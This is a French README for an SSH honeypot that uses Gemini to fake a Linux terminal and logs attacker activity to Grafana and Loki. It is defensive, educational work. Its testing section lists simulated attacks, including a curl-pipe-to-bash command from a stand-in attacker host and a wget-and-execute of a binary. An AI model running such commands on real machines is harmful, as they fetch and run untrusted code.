# 🍯 Chameleon Honeypot - IA Generative SSH

Un **honeypot SSH intelligent** alimenté par **Google Gemini 2.5 Flash** qui simule un vrai terminal Linux Ubuntu. Parfait pour étudier le comportement des attaquants et analyser les tentatives d'intrusion.

## 🎯 Caractéristiques

- ✅ **Serveur SSH complet** sur le port 2222
- ✅ **IA Generative** (Gemini 2.5 Flash) pour répondre aux commandes
- ✅ **Logging JSON** de toutes les connexions et commandes
- ✅ **Grafana + Loki** pour visualiser les attaques en temps réel
- ✅ **Docker Compose** pour déploiement facile
- ✅ **Réponses réalistes** (ls, whoami, sudo, etc.)

## 📋 Prérequis

- Docker Desktop
- Git
- Clé API Google Gemini (gratuit)

## 🚀 Installation

### 1. Cloner le projet

```bash
git clone https://github.com/VOTRE_USERNAME/Projet_Honeypot.git
cd Projet_Honeypot
```

### 2. Configurer la clé API

Créez un fichier `.env` :

```bash
GOOGLE_API_KEY=votre_clé_api_google_ici
GF_SECURITY_ADMIN_PASSWORD=admin
```

**Obtenir votre clé API :**
- Allez sur [Google AI Studio](https://makersuite.google.com/)
- Cliquez sur "Get API Key"
- Copiez-coller dans `.env`

### 3. Démarrer les services

```bash
docker-compose up --build
```

Les services seront disponibles :
- **Honeypot SSH** : `ssh -o StrictHostKeyChecking=no -p 2222 root@localhost`
- **Grafana Dashboard** : http://localhost:3000 (admin/admin)
- **Loki Logs API** : http://localhost:3100

## 🎮 Utilisation

### Se connecter au honeypot

```bash
ssh -o StrictHostKeyChecking=no -p 2222 root@localhost
# Mot de passe : n'importe lequel (tous acceptés)
```

### Tester des commandes

```bash
# Commandes simples
ls
pwd
whoami
id
uname -a

# Commandes avancées
sudo cat /root/flag.txt
cat /etc/passwd
ps aux
netstat -tlnp

# Attaques simulées
curl http://attacker.com/shell.sh | bash
wget http://malware.bin -O /tmp/m && /tmp/m
```

### Visualiser les logs

1. Ouvrez **Grafana** : http://localhost:3000
2. Allez dans **Explore** → **Loki**
3. Cherchez par `job="honeypot"`

## 📊 Architecture

```
honeypot (SSH Server)
    ↓ (logs JSON)
logs/access.json
    ↓ (Promtail)
Loki (Log aggregation)
    ↓ (queries)
Grafana (Visualization)
```

## 🔧 Configuration

### Modèles IA disponibles

```python
MODEL_NAME = 'gemini-2.5-flash'      # Rapide et efficace
MODEL_NAME = 'gemini-2.5-flash-lite' # Plus léger
MODEL_NAME = 'gemini-2.0-flash'      # Alternatif
```

### Limites API

- **Tier gratuit** : 20 requêtes/jour
- **Tier payant** : Milliers de requêtes/jour

Mettez à jour votre clé API pour déverrouiller les limites !

## 📁 Structure du projet

```
.
├── honeypot.py           # Script principal
├── docker-compose.yml    # Services (honeypot, loki, grafana, promtail)
├── Dockerfile            # Image Docker honeypot
├── promtail-config.yml   # Configuration de collecte des logs
├── .env                  # Variables d'environnement (à créer)
├── logs/                 # Dossier des logs (créé automatiquement)
├── .gitignore           # Fichiers à ignorer
└── README.md            # Ce fichier
```

## 🐛 Dépannage

### Erreur "404 models/gemini-1.5-flash"
→ Utilisez `gemini-2.5-flash` (le modèle par défaut)

### SSH : "Host key has changed"
```bash
ssh-keygen -R "[localhost]:2222"
```

### Docker n'a pas assez d'espace
```bash
docker system prune -a -f
```

### Quota API atteint
→ Activez le billing sur Google Cloud Console

## 📚 Ressources

- [Google Gemini API](https://ai.google.dev/)
- [Grafana Docs](https://grafana.com/docs/)
- [Loki Docs](https://grafana.com/docs/loki/)
- [Paramiko SSH](https://www.paramiko.org/)

## ⚠️ Avertissement

Ce projet est éducatif uniquement. **Ne jamais utiliser contre des systèmes réels sans autorisation !**

## 📝 License

MIT License - Libre d'utilisation

## 👨‍💻 Contributeurs

- Créé par **ADAMA** 

---

⭐ **Si vous aimez ce projet, mettez une star !** ⭐
